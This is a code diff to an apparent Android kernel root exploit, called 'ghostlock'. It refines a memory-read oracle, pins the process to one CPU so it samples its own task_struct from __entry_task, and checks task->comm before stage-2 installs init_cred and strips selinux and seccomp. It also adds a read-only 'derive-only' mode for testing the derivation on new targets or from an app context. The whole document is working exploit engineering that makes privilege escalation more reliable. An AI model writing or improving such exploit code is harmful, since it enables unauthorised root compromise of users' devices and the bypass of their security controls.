@@ -639,6 +639,16 @@ static int eqs_read_boot_id_raw(unsigned char raw[16]) {
 
 /* Reads 8 bytes at q using the boot_id redirect oracle. q+8 is clobbered by the
  * shape-0 collateral, exactly like the standalone exploit. */
+/* CPU that must be current when __entry_task[cpu] is sampled (see eqs_read64).
+ * -1 disables the guard. __entry_task[cpu] is written by every context switch, so
+ * the value is only "us" if *we* are the task running on cpu at the instant the
+ * kernel dereferences the redirected boot_id .data. A running thread cannot
+ * migrate mid-syscall, so checking sched_getcpu() inside the read syscall is
+ * sufficient -- and without this check the sampled task can be an innocent
+ * process (e.g. a system_server thread), which is exactly how stage-2 could write
+ * init_cred / zero thread_info.flags into somebody else. */
+static int eqs_sample_cpu = -1;
+
 static int eqs_read64(uintptr_t q, uint64_t *out, const char *name, int *idx) {
   const uintptr_t b = SLIDE_RANDOM_BOOT_ID_DATA;
   if (!out || !idx || (q & 7) != 0 || q > UINTPTR_MAX - 16) {
@@ -652,6 +662,27 @@ static int eqs_read64(uintptr_t q, uint64_t *out, const char *name, int *idx) {
       pr_warning("eqs-read retry name=%s attempt=%d slot=%d reason=primitive\n",
                  name, attempt, slot);
       continue;
+    }
+    /* __entry_task[cpu] is sampled inside this read; if we are not on
+       eqs_sample_cpu at this instant, the value belongs to another process. */
+    if (eqs_sample_cpu >= 0) {
+      int now = sched_getcpu();
+      if (now != eqs_sample_cpu) {
+        pin_to_core((size_t)eqs_sample_cpu);
+        for (int spin = 0; spin < 500 && sched_getcpu() != eqs_sample_cpu;
+             spin++) {
+          usleep(1000);
+        }
+        int again = sched_getcpu();
+        if (again != eqs_sample_cpu) {
+          pr_error("eqs-read sample-cpu guard name=%s want=%d before=%d "
+                   "after=%d -- refusing to sample another task\n",
+                   name, eqs_sample_cpu, now, again);
+          return 0;
+        }
+        pr_success("eqs-read sample-cpu re-pinned name=%s want=%d was=%d\n",
+                   name, eqs_sample_cpu, now);
+      }
     }
     unsigned char raw[16] = {0};
     if (!eqs_read_boot_id_raw(raw)) {
@@ -899,17 +930,51 @@ static int eqs_cpu_online(int cpu) {
   return b[0] == '1';
 }
 
+/* Highest CPU that is both online and inside our current affinity mask. Picking
+ * the highest *online* CPU is wrong for an app: untrusted_app cpusets are
+ * restricted (eqs: foreground=0-6), so pin_to_core() silently fails and the
+ * process keeps migrating while we still index __entry_task by the CPU we merely
+ * observed earlier. */
 static int eqs_pick_top_cpu(void) {
+  cpu_set_t allowed;
+  CPU_ZERO(&allowed);
+  int have_mask = sched_getaffinity(0, sizeof(allowed), &allowed) == 0;
   long conf = sysconf(_SC_NPROCESSORS_CONF);
   if (conf <= 0 || conf > CPU_SETSIZE) {
     conf = CPU_SETSIZE;
   }
   for (int cpu = (int)conf - 1; cpu >= 0; cpu--) {
+    if (have_mask && !CPU_ISSET(cpu, &allowed)) {
+      continue;
+    }
     if (eqs_cpu_online(cpu)) {
       return cpu;
     }
   }
   return sched_getcpu();
+}
+
+/* NAME_MAX-ish: first 8 bytes of task->comm, compared against our own. */
+static int eqs_task_comm_matches(int *idx, uint64_t task, const char *what) {
+  unsigned char comm[16] = {0};
+  char mine[16] = {0};
+  if (prctl(PR_GET_NAME, mine) != 0) {
+    pr_warning("eqs %s PR_GET_NAME failed errno=%d\n", what, errno);
+    return 1; /* cannot check: do not block the exploit on this */
+  }
+  uintptr_t slot = (uintptr_t)task + TASK_COMM_OFF;
+  uint64_t first = 0;
+  if (!eqs_read64(slot, &first, "own_task_comm", idx)) {
+    pr_warning("eqs %s own-task comm read failed task=%016llx\n", what,
+               (unsigned long long)task);
+    return 1;
+  }
+  memcpy(comm, &first, sizeof(first));
+  int ok = memcmp(comm, mine, sizeof(first)) == 0;
+  pr_success("eqs %s own-task identity task=%016llx task_comm=%.8s "
+             "self_comm=%.8s match=%d\n",
+             what, (unsigned long long)task, (const char *)comm, mine, ok);
+  return ok;
 }
 
 /* Pin to the top online CPU and read this process's own task_struct through
@@ -930,6 +995,18 @@ static int eqs_derive_own_task(int *idx, uint64_t *task_out, int *cpu_out) {
   if (cpu < 0 || cpu > 63) {
     pr_error("eqs own-task bad cpu=%d\n", cpu);
     return 0;
+  }
+  {
+    cpu_set_t got;
+    CPU_ZERO(&got);
+    int pinned_ok = sched_getaffinity(0, sizeof(got), &got) == 0 &&
+                    CPU_ISSET(cpu, &got) && CPU_COUNT(&got) == 1;
+    pr_success("eqs own-task pick want_cpu=%d observed=%d pinned=%d\n",
+               want_cpu, cpu, pinned_ok);
+    if (!pinned_ok) {
+      pin_to_core((size_t)cpu);
+    }
+    eqs_sample_cpu = cpu;
   }
 
   uintptr_t percpu_slot = (uintptr_t)eqs_kaslr_base + EQS_OFF_PER_CPU_OFFSET +
@@ -957,10 +1034,18 @@ static int eqs_derive_own_task(int *idx, uint64_t *task_out, int *cpu_out) {
     pr_error("eqs own-task bad task=%016llx\n", (unsigned long long)task);
     return 0;
   }
+  eqs_sample_cpu = -1;
   pr_success("eqs own-task cpu=%d entry_slot=%016zx percpu_delta=%016llx "
              "task=%016llx\n",
              cpu, entry_slot, (unsigned long long)percpu_delta,
              (unsigned long long)task);
+  if (!eqs_task_comm_matches(idx, task, "stage2")) {
+    pr_error("eqs own-task identity mismatch: refusing to write into "
+             "task=%016llx (sampled on cpu=%d)\n",
+             (unsigned long long)task, cpu);
+    return 0;
+  }
+  eqs_sample_cpu = cpu; /* keep guarding later re-derivations */
   *task_out = task;
   *cpu_out = cpu;
   return 1;
@@ -977,6 +1062,17 @@ int slide_eqs_root_stage(void) {
   int cpu = -1;
   if (!eqs_derive_own_task(&idx, &task, &cpu)) {
     return 0;
+  }
+  /* Read-only diagnostic: prove (or disprove) that the sampled task really is
+     this process, without performing a single kernel write. Everything after
+     this point (cred install, selinux, seccomp) is skipped, so this mode cannot
+     destabilise the device -- use it to validate the derivation on a new target
+     or from an app context. */
+  if (getenv("GHOSTLOCK_DERIVE_ONLY")) {
+    pr_success("eqs derive-only: task=%016llx cpu=%d uid=%u -- stopping before "
+               "any write\n",
+               (unsigned long long)task, cpu, getuid());
+    return 1;
   }
   pr_success("eqs stage-2 enter cpu=%d pid=%d uid=%u kaslr=%016llx\n", cpu,
              getpid(), getuid(), (unsigned long long)eqs_kaslr_base);
